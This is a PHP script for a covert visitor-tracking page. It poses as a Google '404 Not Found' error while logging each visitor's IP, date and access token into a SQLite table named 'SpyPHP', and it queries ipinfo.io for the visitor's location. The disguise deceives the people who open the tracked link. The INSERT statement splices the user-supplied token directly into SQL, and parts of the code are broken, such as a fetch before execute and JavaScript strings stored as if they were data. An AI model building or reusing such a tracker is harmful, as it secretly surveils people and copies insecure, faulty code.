<?php
session_start();
header('Content-Type: text/html; charset=utf-8');

$access = htmlspecialchars($_GET["access"]);
$tokenurl = "https://www.deinebibel.eu/confirm.php?token=$access";
if (!$access) {
    exit();
}

?>

<!DOCTYPE html>
<html lang=en>
<title>Error 404 (Not Found)!</title>

<head>
    <meta charset=utf-8>
    <meta name=viewport content="initial-scale=1, minimum-scale=1, width=device-width">
    <meta name="robots" content="noindex" />
    <link rel="stylesheet" href="./css/google.css">
    <title>Welcome</title>
    <style>

    </style>
</head>

<body>

    <?php
    require('./inc/inc_func.php');
    require('./inc/inc_config.php');
    ?>

    <script type="text/javascript" src="./js/stats.js"></script>
    <a href=//www.google.com /><span id=logo aria-label=Google></span></a>
    <p><b>404.</b> <ins>That’s an error.</ins>
    <p>The requested URL was not found on this server. <ins>That’s all we know.</ins>
</body>

</html>

<?php
// CLIENT INFORMATION
$browser = "<script>document.writeln(nVer);</script>";
$agent = "<script>document.writeln(nAgt);</script>";
$browserName = "<script>document.writeln(browserName);</script>";
$fullVersion = "<script>document.writeln(fullVersion);</script>";
$majorVersion = "<script>document.writeln(majorVersion);</script>";
$clientIp = getIpAddress();
$timeStamp = date("Y-m-d");

// IP DETAILS
$ipinfo = json_decode(file_get_contents("https://ipinfo.io/{$clientIp}"));
// $ipcountry = $ipinfo->country;
// $ipcity = $ipinfo->city;
// $ipgeo = "$ipcountry ($ipcity)";
// $iphost = $ipinfo->hostname;
// $iporg = $ipinfo->org;
// $ipprovider = "$iphost, ASN: $iporg";

// INSERT INTO DB
$conn = new PDO("sqlite:" . $dbPath);
$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

$stmt = $conn->prepare("SELECT * FROM SpyPHP WHERE UrlId LIKE 'fuck';");
$row = $stmt->fetch(PDO::FETCH_ASSOC);
var_dump($row);
// DIE IF RECORD ALREADY EXIST TO AVOID SPAMMING THE DB
if ($row) {
    exit();
}

$stmt = $conn->prepare("INSERT INTO $tableName (Timestamp, UrlId, IP, ISP, Country, City, Language, Browser, Resolution, OS, Device)
VALUES (
    '$timeStamp',
    '$access',
    '$clientIp',
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL
   )");
$result = $stmt->execute();

exit();
// END OF SCRIPT
?>